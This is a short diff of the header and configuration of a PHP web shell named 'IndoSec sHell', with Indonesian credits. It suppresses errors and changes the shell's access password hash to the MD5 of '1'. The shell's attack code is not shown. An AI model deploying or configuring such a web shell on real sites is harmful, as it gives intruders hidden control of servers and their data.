@@ -10,7 +10,7 @@
     * Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya
 
     * { IndoSec sHell }
-    * ©2019 { IndoSec } -Holiq-
+    * Â©2019 { IndoSec } -Holiq-
     * Contact Me? fb.com/holiq.xid, WhatsApp? Cek Bio Fb
     * Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.2
 */
@@ -25,7 +25,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$aupas = '54062f3bf6377d42b4fab7c8fedfc7da'; // IndoSec
+$aupas = 'c4ca4238a0b923820dcc509a6f75849b'; // IndoSec
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
